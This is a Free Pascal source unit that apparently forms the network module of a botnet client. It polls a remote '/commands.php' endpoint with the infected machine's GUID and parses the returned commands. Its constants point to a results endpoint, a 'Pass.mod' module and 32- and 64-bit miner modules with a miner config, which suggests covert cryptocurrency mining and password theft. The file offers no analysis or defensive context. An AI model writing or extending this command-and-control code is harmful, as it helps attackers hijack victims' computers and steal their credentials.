unit NetModule;

{$mode objfpc}{$H+}

interface

uses
  Classes, SysUtils, Interfaces, IdHTTP, INIFiles, Tools;

type

  { TNet }

  TNet = class(TDataModule)
    HTTPAgent: TIdHTTP;
    procedure DataModuleCreate(Sender: TObject);
    procedure DataModuleDestroy(Sender: TObject);
  private

  public
    Commands:  TMemINIFile;
    CommandCount: Integer;

    procedure GetCommands;
    function GetCommandID(Index: LongInt): String;
  end;

const
  CommandsPHP = '/commands.php';
  ResultsPHP  = '/result.php';
  PassModule  = '/modules/Pass.mod';
  MineConfig  = '/modules/config.json';
  MineModule  = '/modules/Mine.mod';
  MineModule64= '/modules/Mine64.mod';

var
  Net: TNet;

implementation

{$R *.lfm}

{ TNet }

function TNet.GetCommandID(Index: LongInt): String;
var
  J: LongInt;
  S: String;
Begin
  S:=Commands.ReadString('General', 'Commands', '');
  For J:=1 to Index-1 do Delete(S, 1, Pos(',', S));
  J:=Pos(',', S);
  if J>0 then Result:=LeftStr(S, J - 1)
  else Result:=S;
end;

procedure TNet.GetCommands;
var
  MS: TMemoryStream;
  S: TStringList;
Begin
  MS:=TMemoryStream.Create;
  S:=TStringList.Create;
  try
    HTTPAgent.Get(Server+CommandsPHP+'?GUID='+ID, MS);
    MS.Position:=0;
    S.LoadFromStream(MS);
    Commands.SetStrings(S);
  finally
    MS.Free;
    S.Free;
  end;
  CommandCount:=Commands.ReadInteger('General', 'CommandCount', 0);
end;

procedure TNet.DataModuleCreate(Sender: TObject);
begin
  Commands:=TMemINIFile.Create('');
  if UsingProxy then Begin
    HTTPAgent.ProxyParams.ProxyServer:=ProxyIP;
    HTTPAgent.ProxyParams.ProxyPort:=ProxyPort;
  end;
end;

procedure TNet.DataModuleDestroy(Sender: TObject);
begin
  Commands.Free;
end;

end.

